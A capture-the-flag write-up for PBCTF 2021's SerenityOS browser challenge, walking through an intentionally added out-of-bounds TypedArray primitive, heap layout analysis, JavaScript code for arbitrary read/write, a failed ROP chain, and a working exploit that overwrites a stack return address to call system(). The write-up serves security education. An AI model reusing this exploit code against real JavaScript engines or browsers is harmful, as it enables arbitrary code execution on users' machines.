PBCTF 2021
==========

# Serenetiy Broowser

> Browser pwns are all the rage, but who has pwnd the SerenityOS browser before?

As the name suggests this challenge was about exploting the default browser application of the [SerenityOS](https://github.com/SerenityOS).
We will start at commit d8de352eadce62789a00f8d6da6c2e77903e9180.
Additionally you were given a patched version of the JavaScript runtime providing a simple OOB read / write:

```diff
diff --git a/Userland/Libraries/LibJS/Runtime/CommonPropertyNames.h b/Userland/Libraries/LibJS/Runtime/CommonPropertyNames.h
index 2fbf591ce..bbb0d4cd9 100644
--- a/Userland/Libraries/LibJS/Runtime/CommonPropertyNames.h
+++ b/Userland/Libraries/LibJS/Runtime/CommonPropertyNames.h
@@ -309,6 +309,7 @@ namespace JS {
     P(of)                                    \
     P(offset)                                \
     P(offsetNanoseconds)                     \
+    P(oob)                     \
     P(overflow)                              \
     P(ownKeys)                               \
     P(padEnd)                                \
diff --git a/Userland/Libraries/LibJS/Runtime/TypedArrayPrototype.cpp b/Userland/Libraries/LibJS/Runtime/TypedArrayPrototype.cpp
index 5efb49a60..c472651c1 100644
--- a/Userland/Libraries/LibJS/Runtime/TypedArrayPrototype.cpp
+++ b/Userland/Libraries/LibJS/Runtime/TypedArrayPrototype.cpp
@@ -56,6 +56,7 @@ void TypedArrayPrototype::initialize(GlobalObject& object)
     define_native_function(vm.names.filter, filter, 1, attr);
     define_native_function(vm.names.map, map, 1, attr);
     define_native_function(vm.names.toLocaleString, to_locale_string, 0, attr);
+    define_native_function(vm.names.oob, oob, 2, attr);

     define_native_accessor(*vm.well_known_symbol_to_string_tag(), to_string_tag_getter, nullptr, Attribute::Configurable);

@@ -1532,4 +1533,27 @@ JS_DEFINE_NATIVE_FUNCTION(TypedArrayPrototype::to_locale_string)
     return js_string(vm, builder.to_string());
 }

+JS_DEFINE_NATIVE_FUNCTION(TypedArrayPrototype::oob)
+{
+    auto* typed_array = validate_typed_array_from_this(global_object);
+    if (!typed_array)
+        return {};
+
+    auto index = vm.argument(0).to_index(global_object);
+    if (vm.exception())
+        return {};
+
+    index *= typed_array->element_size();
+
+    if (vm.argument(1).is_undefined()) {
+        return typed_array->get_value_from_buffer(index, ArrayBuffer::Unordered);
+    } else {
+        auto value = vm.argument(1);
+        if (vm.exception())
+            return {};
+        typed_array->set_value_in_buffer(index, value, ArrayBuffer::Unordered);
+        return {};
+    }
+}
+
 }
diff --git a/Userland/Libraries/LibJS/Runtime/TypedArrayPrototype.h b/Userland/Libraries/LibJS/Runtime/TypedArrayPrototype.h
index 2e2462467..51fc4ab78 100644
--- a/Userland/Libraries/LibJS/Runtime/TypedArrayPrototype.h
+++ b/Userland/Libraries/LibJS/Runtime/TypedArrayPrototype.h
@@ -52,6 +52,7 @@ private:
     JS_DECLARE_NATIVE_FUNCTION(filter);
     JS_DECLARE_NATIVE_FUNCTION(map);
     JS_DECLARE_NATIVE_FUNCTION(to_locale_string);
+    JS_DECLARE_NATIVE_FUNCTION(oob);
 };

 }
diff --git a/Userland/Services/WebContent/main.cpp b/Userland/Services/WebContent/main.cpp
index aa37ad0cf..684901e83 100644
--- a/Userland/Services/WebContent/main.cpp
+++ b/Userland/Services/WebContent/main.cpp
@@ -32,10 +32,10 @@ int main(int, char**)
         perror("unveil");
         return 1;
     }
-    if (unveil(nullptr, nullptr) < 0) {
-        perror("unveil");
-        return 1;
-    }
+    // if (unveil(nullptr, nullptr) < 0) {
+    //     perror("unveil");
+    //     return 1;
+    // }

     auto socket = Core::LocalSocket::take_over_accepted_socket_from_system_server();
     VERIFY(socket);

```

Furthermore notice the patched `unveil` syscall, loosening some hardening on files you are allowed to access (though I am not sure why, `unveil`s are lost upon `execve` anyways)

Since SerenityOS is built with a lot of assertions enabled, the following are disabled in order to allow writing outside of allocated memory buffers:
```diff
diff --git a/AK/ByteBuffer.h b/AK/ByteBuffer.h
index ec8474e37..f3a85f9f5 100644
--- a/AK/ByteBuffer.h
+++ b/AK/ByteBuffer.h
@@ -130,7 +130,7 @@ public:
     [[nodiscard]] ByteBuffer slice(size_t offset, size_t size) const
     {
         // I cannot hand you a slice I don't have
+        // VERIFY(offset + size <= this->size());
-        VERIFY(offset + size <= this->size());

         return copy(offset_pointer(offset), size);
     }
diff --git a/AK/Span.h b/AK/Span.h
index e20204c56..565e2d977 100644
--- a/AK/Span.h
+++ b/AK/Span.h
@@ -125,7 +125,7 @@ public:
     }
     [[nodiscard]] ALWAYS_INLINE constexpr Span slice(size_t start) const
     {
+        // VERIFY(start <= size());
-        VERIFY(start <= size());
         return { this->m_values + start, size() - start };
     }
     [[nodiscard]] ALWAYS_INLINE constexpr Span slice_from_end(size_t count) const
```

With all that covered, let's start pwning!

The `oob()` primitive allows us to read at an offset from the allocated buffer.
Specifically this buffer will be backed by an `ArrayBuffer` and the read will start at `m_buffer` (note that SerenityOS is a 32bit OS):
```cpp
// pahole -C 'ArrayBuffer' libjs.so
class ArrayBuffer : public Object {
public:

  /* class Object              <ancestor>; */      /*     0     32 */

protected:
  struct Variant<AK::Empty, AK::Detail::ByteBuffer<32>, AK::Detail::ByteBuffer<32>*> m_buffer __attribute__((__aligned__(4))); /*    32    44 */

  /* XXX last struct has 3 bytes of padding */

  /* --- cacheline 1 boundary (64 bytes) was 12 bytes ago --- */
  class Value               m_detach_key;          /*    76    12 */
  /* vtable has 2 entries: {
     [3] = class_name((null)),
     [5] = visit_edges((null)),
  } */
  /* size: 88, cachelines: 2, members: 3 */
  /* sum members: 56, holes: 1, sum holes: 32 */
  /* paddings: 1, sum paddings: 3 */
  /* forced alignments: 1 */
  /* last cacheline: 24 bytes */
} __attribute__((__aligned__(4)));
```

Note that the buffer is inlined if the size is less than 32 bytes.
As I am writing this, the obvious way to leak a pointer of such a buffer would be to allocate one `ArrayBuffer` with a small size less than 32 bytes and another one with size greater than 32 bytes right after.
Since the JS heap implementation is rather simple, this boils down to just creating them one after another.
We could then use the `oob()` of the first buffer in order to read the `AK::Detail::ByteBuffer<32>*` from the `m_buffer` variant.
That would result in an arbitrary read / write since we then would know the correct offset when using the second buffer's `oob()`.

Anyway I went a different route :(
For that a little primer on how the JS works:
- It has allocators for fixed sizes of 32, 64, 128, 256, .. bytes.
- For each object to be allocated the list of allocators is traversed in order and the first object is placed by the first allocator having a sufficient size.

This will put an allocated `ArrayBuffer` into the 128-byte-bin.
The always needed `TypedArray` required in order to use the `oob()` we can quickly verify to land inside the 64-byte-bin:

```cpp
// pahole -C 'TypedArrayBase' libjs.so
class TypedArrayBase : public Object {
  enum ContentType {
    BigInt = 0,
    Number = 1,
  };

public:

  /* class Object              <ancestor>; */      /*     0     32 */

protected:

  u32                        m_array_length;       /*    32     4 */
  u32                        m_byte_length;        /*    36     4 */
  u32                        m_byte_offset;        /*    40     4 */
  enum ContentType           m_content_type;       /*    44     4 */
  class ArrayBuffer *        m_viewed_array_buffer; /*    48     4 */

  /* vtable has 9 entries: {
     [3] = class_name((null)),
     [26] = element_size((null)),
     [27] = element_name((null)),
     [28] = is_unclamped_integer_element_type((null)),
     [29] = is_bigint_element_type((null)),
     [30] = get_value_from_buffer((null)),
     [31] = set_value_in_buffer((null)),
     [32] = get_modify_set_value_in_buffer((null)),
     [5] = visit_edges((null)),
  } */
  /* size: 52, cachelines: 1, members: 6 */
  /* sum members: 20, holes: 1, sum holes: 32 */
  /* last cacheline: 52 bytes */
} __attribute__((__aligned__(4)));

```

There also is that interesting member `m_viewed_array_buffer` which could leak the pointer to our `ArrayBuffer` as well.
But how do we get this 64-byte-bin to be accessable from inside our 128-byte-bin ?
These bins are allocated in a randomized manner, thus heap-spraying and hoping for the best could be an option.
However I quickly gave up on that as I could not get it to work anywhere close to working consistently.

I changed strategy and looked for objects which would be allocated inside the 128-byte-bin.
A particularly interesting one is the `ProxyObject`:
```cpp
// pahole -C 'ProxyObject' libjs.so
class ProxyObject : public FunctionObject {
public:

  /* class FunctionObject      <ancestor>; */      /*     0     80 */

  /* --- cacheline 1 boundary (64 bytes) was 16 bytes ago --- */
  class Object &             m_target;             /*    80     4 */
  class Object &             m_handler;            /*    84     4 */
  bool                       m_is_revoked;         /*    88     1 */
  /* vtable has 19 entries: {
     [3] = class_name((null)),
     [26] = call((null)),
     [27] = construct((null)),
     [28] = name((null)),
     [29] = create_environment((null)),
     [6] = internal_get_prototype_of((null)),
     [7] = internal_set_prototype_of((null)),
     [8] = internal_is_extensible((null)),
     [9] = internal_prevent_extensions((null)),
     [10] = internal_get_own_property((null)),
     [11] = internal_define_own_property((null)),
     [12] = internal_has_property((null)),
     [13] = internal_get((null)),
     [14] = internal_set((null)),
     [15] = internal_delete((null)),
     [16] = internal_own_property_keys((null)),
     [5] = visit_edges((null)),
     [17] = is_function((null)),
     [21] = is_proxy_object((null)),
  } */
  /* size: 92, cachelines: 2, members: 4 */
  /* sum members: 9, holes: 1, sum holes: 80 */
  /* padding: 3 */
  /* last cacheline: 28 bytes */
} __attribute__((__aligned__(4)));
```

Specifically the members `m_target` and `m_handler` could be used to leak pointers to our `ArrayBuffer` by initializing a new `ProxyObject` like this:

```js
var buf = ArrayBuffer(0);
var proxy = new Proxy(buf, {});
```

With a few little extras and `Uint32Array`s in order to actually use the `oob()` we will arrive at arbitrary read / write with the following:
```js
var buf = new ArrayBuffer(0);

var a1 = new Uint32Array(0);
var a2 = new Uint32Array(0);

// allocated by the 128-byte allocator, just like the backing ArrayBuffer s of the Uint32Array s
// and it has these nice m_target / m_handler members which are very useful to leak addresses
var p = new Proxy(buf, {});

// each bin has size 128. We start at bin+32 (ArrayBuffer::m_buffer)
// first skip rest of a1, then skip a2. We want Proxy::m_target which is at offset +80
// we divide by 4 because sizeof(Uint32) == 4
var m_target = a1.oob((128 - 32 + 128 + 80) / 4)
console.log("Proxy::m_target =", m_target.toString(16))

var a1_arraybuffer = m_target + 128 + 32
console.log("a1 m_viewed_array_buffer =", a1_arraybuffer.toString(16))

// Now that we know the pointer of m_viewed_array_buffer (i. e. the start address of our oob read/write) we have arbitrary read/write
function read(addr) {
  if (addr >= a1_arraybuffer) {
    return a1.oob((addr - a1_arraybuffer) / 4)
  } else {
    return a1.oob(((~a1_arraybuffer + 1) >>> 0) / 4 + addr / 4)
  }
}

function write(addr, value) {
  if (addr >= a1_arraybuffer) {
    a1.oob((addr - a1_arraybuffer) / 4, value)
  } else {
    a1.oob(((~a1_arraybuffer + 1) >>> 0) / 4 + addr / 4, value)
  }
}
```

With those primitives exploitation should be easy right?
After avoiding some pitfalls, nope it isn't.
Specifically, I tried to go some shellcode routes:
```js
var pop5 = libc_base + 0x0008e44b // add esp, 4; mov eax, esi; pop ebx; pop esi; pop edi; pop ebp; ret;
var pop7 = libc_base + 0x0001a5e5 // add esp, 0x10; inc eax; pop ebx; pop esi; pop ebp; ret;

var chain = [
  mmap,
  0xDEADBEEF, // padding, not sure why needed here?
  pop7,
  0xaa000000,
  0x2000,
  PROT_READ | PROT_WRITE | PROT_EXEC,
  MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS,
  0, // fd
  0, // offset
  0xDEADBEEF, // padding for pop7

  memcpy,
  pop5,
  0xaa000000, // dst
  shellcode_ptr, // src
  shellcode.length * 4,
  0xDEADBEEF,
  0xDEADBEEF,

  mprotect,
  pop5,
  0xaa000000,
  0x2000,
  PROT_READ | PROT_EXEC,
  0xDEADBEEF,
  0xDEADBEEF,

  0xaa000000,
]
```
... which turned out to be very unsuccessfull because SerenityOS does not allow marking pages eXecutable if they were writeable beforehand:
```cpp
// in mmap.cpp:90+
    if (make_writable && region->has_been_executable())
        return false;

    if (make_executable && region->has_been_writable()) {
        if (should_make_executable_exception_for_dynamic_loader(make_readable, make_writable, make_executable, *region))
            return true;

        return false;
    }
```

I pretty much tried the easy route after this one.
After leaking addresses to libc.so I wrote a shell command onto the stack and executed it using `system()` ¯\\\_(ツ)\_/¯:

```js
// we are leaking Shape objects here
var libjs_base = a1.oob((128 - 32) / 4) - 0x31aa34
console.log("libjs base @", libjs_base.toString(16))

/*
$> nm -Cl Build/i686/Userland/Libraries/LibJS/libjs.so| grep _GLOBAL_OFFSET_TABLE_
0032227c d _GLOBAL_OFFSET_TABLE_
*/
var libjs_got = libjs_base + 0x0032227c
console.log("libjs .got @", libjs_got.toString(16))

/*
$> objdump -Cd -j .plt Build/i686/Userland/Libraries/LibJS/libjs.so | grep memmove -A4
00084360 <memmove@plt>:
   84360:	ff a3 dc 00 00 00    	jmp    *0xdc(%ebx)
   84366:	68 a0 01 00 00       	push   $0x1a0
   8436b:	e9 a0 fc ff ff       	jmp    84010 <_init+0x10>
*/
var memmove = read(libjs_got + 0xdc)
console.log("memmove @", memmove.toString(16))

/*
nm -Cl Build/i686/Userland/Libraries/LibC/libc.so | grep memmove
00045320 T memmove	./Build/i686/../../Userland/Libraries/LibC/string.cpp:155
*/
var libc_base = memmove - 0x00045320
console.log("libc_base @", libc_base.toString(16))

/*
nm -Cl Build/i686/Userland/Libraries/LibC/libc.so | grep system
00043280 T system	./Build/i686/../../Userland/Libraries/LibC/stdlib.cpp:758
*/
var system = libc_base + 0x00043280

// read environ global variable
/*
objdump -Cd -j .bss Build/i686/Userland/Libraries/LibC/libc.so | grep '<environ'
000a6394 <environ>:
*/
var stack_leak = read(libc_base + 0x000a6000 + 0x394)
console.log("stack leak =", stack_leak.toString(16))

// /bin/TextEditor /flag.txt
cmd = [1852400175, 2019906607, 1768179060, 544370548, 1634493999, 2020879975, 116]

console.log("searching for return address in libjs JS::Program::execute address range ..")
var x;
for (var i = 0; ; i++) {
  x = read(stack_leak - i * 4);
  if (x >= libjs_base + 0x8d240 && x <= libjs_base + 0x8d33d) {
    var stack_ret = stack_leak - i * 4;
    console.log("Found it!", stack_ret.toString(16))

    console.log("Writing command onto stack ..")
    var ptr = stack_ret + 0x200

    for (var j = 0; j < cmd.length; j++) {
      write(ptr + 4 * j, cmd[j]);
    }

    console.log("cmd @", ptr.toString(16))

    console.log("Taking control ..")
    write(stack_ret + 0 * 4, system);
    write(stack_ret + 1 * 4, 0xDEADBEEF);
    write(stack_ret + 2 * 4, 0xAAAAAAAA); // dummy return address. We will crash after
    write(stack_ret + 3 * 4, ptr);

    break
  }
}

```

Well this works for the `js` shell interpreter.
But.. the `Browser` has additional sandboxing enabled, thus we cannot simply execute a new process.
Which means, we have to read the flag file, leak its content to the JavaScript runtime and eventually exfiltrate this information by sending a request using the Browser's standard facilities.

We will leave this exercise for another day ..
